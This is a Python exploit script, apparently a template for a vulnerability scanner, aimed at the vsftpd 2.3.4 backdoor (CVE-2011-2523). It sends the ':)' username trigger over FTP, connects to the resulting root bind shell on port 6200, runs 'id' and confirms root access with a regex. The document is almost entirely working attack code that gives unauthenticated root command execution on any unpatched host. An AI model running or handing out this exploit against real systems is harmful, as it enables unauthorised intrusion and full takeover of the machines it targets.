"""
ATTACK NAME: vsftpd 2.3.4 Backdoor
PORT: 21 (Trigger) -> 6200 (Payload)
CVE: CVE-2011-2523

VULNERABILITY: A malicious backdoor was inserted into the vsftpd 2.3.4 source code.
If a username ends in the smiley face characters ':)', the daemon spawns a 
listening root shell on port 6200.

HOW IT WORKS:
1. Connect to FTP (Port 21).
2. Send 'USER user:)' and 'PASS pass'.
3. Connect to the newly opened bind shell on Port 6200.
4. Execute commands as root.

SECURITY IMPACT: Critical. Unauthenticated Remote Code Execution (RCE).
"""

import socket
import re
import time

def validate_evidence(validation_rule, result):
    if result is None: return False
    try:
        if validation_rule.get("type") == "regex":
            return re.search(validation_rule.get("pattern"), str(result), re.IGNORECASE) is not None
    except Exception as e:
        print(f"[!] Validation Error: {e}")
    return False

TARGET_IP = "victim"

# The "Template" Data
TEMPLATE = {
    "params": {
        "port": 21, 
        "trigger_payload": "USER backdoored:)\r\nPASS pass\r\n",
        "shell_port": 6200,
        "shell_payload": "id\n",
        "timeout": 5
    },
    "validation": {
        "type": "regex",
        "pattern": r"uid=0\(root\)"
    }
}

def run_test():
    print(f"[*] Attacking {TARGET_IP} on Port 21 (vsftpd)...")

    # --- STEP 1: FIRE THE TRIGGER ON PORT 21 ---
    try:
        print("[*] Sending the ':)' trigger to FTP...")
        with socket.create_connection((TARGET_IP, TEMPLATE["params"]["port"]), timeout=TEMPLATE["params"]["timeout"]) as s:
            # Consume the FTP welcome banner
            s.recv(1024)
            # Send the smiley face
            s.sendall(TEMPLATE["params"]["trigger_payload"].encode())
            time.sleep(1) # Give the OS time to open port 6200
    except Exception as e:
        print(f"[!] FTP Trigger Failed: {e}")
        return

    # --- STEP 2: CONNECT TO THE BACKDOOR SHELL ON PORT 6200 ---
    print(f"[*] Connecting to secret backdoor on Port {TEMPLATE['params']['shell_port']}...")
    raw_response = ""
    try:
        with socket.create_connection((TARGET_IP, TEMPLATE["params"]["shell_port"]), timeout=TEMPLATE["params"]["timeout"]) as s:
            # Send our validation command
            s.sendall(TEMPLATE["params"]["shell_payload"].encode())
            time.sleep(1)
            
            # Read the output
            s.setblocking(False)
            try:
                while True:
                    chunk = s.recv(4096).decode(errors='ignore')
                    if not chunk: break
                    raw_response += chunk
            except BlockingIOError:
                pass
            
            print(f"[+] Evidence Harvested:\n{raw_response.strip()}")
            
    except ConnectionRefusedError:
        print("[!] Connection Refused on 6200. The trigger failed or service is patched.")
        return
    except Exception as e:
        print(f"[!] Shell Connection Failed: {e}")
        return

    # --- STEP 3: VALIDATE ---
    print("[*] Running Validator...")
    is_success = validate_evidence(TEMPLATE["validation"], raw_response)
    
    if is_success:
        print("✅ VERDICT: VULNERABILITY CONFIRMED. vsftpd backdoor triggered.")
    else:
        print("❌ VERDICT: EXPLOIT FAILED.")

if __name__ == "__main__":
    run_test()